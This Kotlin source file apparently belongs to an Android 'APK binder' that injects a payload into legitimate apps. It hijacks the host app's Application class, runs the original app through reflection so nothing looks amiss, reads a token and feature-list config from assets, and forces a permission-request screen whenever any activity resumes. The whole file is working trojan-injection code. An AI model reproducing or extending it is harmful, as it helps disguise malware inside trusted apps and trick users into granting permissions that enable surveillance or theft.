package Com.devhs.apkbinder.payload

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Bundle
import Com.devhs.apkbinder.core.Const
import org.json.JSONObject

class PayloadApp : Application() {

    private var gateShown = false
    private var original: Application? = null

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
        try {
            val orig = readConfig()?.optString("origApp").orEmpty()
            if (orig.isNotEmpty() && orig != Const.PAYLOAD_APP) {
                val instance = Class.forName(orig).getDeclaredConstructor().newInstance() as Application
                val method = Context::class.java.getDeclaredMethod("attachBaseContext", Context::class.java)
                method.isAccessible = true
                method.invoke(instance, base)
                original = instance
            }
        } catch (_: Throwable) {
        }
    }

    override fun onCreate() {
        super.onCreate()
        try { original?.onCreate() } catch (_: Throwable) {}

        val cfg = readConfig()
        if (cfg == null && !PayloadState.testMode) return
        if (cfg != null && cfg.optString("token").isEmpty()) return

        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
            override fun onActivityResumed(activity: Activity) {
                if (gateShown) return
                if (activity is PermissionGateActivity) return
                gateShown = true
                try {
                    startActivity(
                        Intent(this@PayloadApp, PermissionGateActivity::class.java)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                } catch (_: Throwable) {
                }
            }
            override fun onActivityCreated(activity: Activity, bundle: Bundle?) {}
            override fun onActivityStarted(activity: Activity) {}
            override fun onActivityPaused(activity: Activity) {}
            override fun onActivityStopped(activity: Activity) {}
            override fun onActivitySaveInstanceState(activity: Activity, bundle: Bundle) {}
            override fun onActivityDestroyed(activity: Activity) {}
        })
    }

    fun readConfig(): JSONObject? = try {
        assets.open(Const.CONFIG_ASSET).use { JSONObject(it.readBytes().decodeToString()) }
    } catch (_: Throwable) {
        null
    }
}

object PayloadState {
    var testMode = false
    var config: JSONObject? = null
    fun enabled(key: String): Boolean {
        val arr = config?.optJSONArray("features") ?: return false
        for (i in 0 until arr.length()) if (arr.optString(i) == key) return true
        return false
    }
}

interface PayloadServiceHost
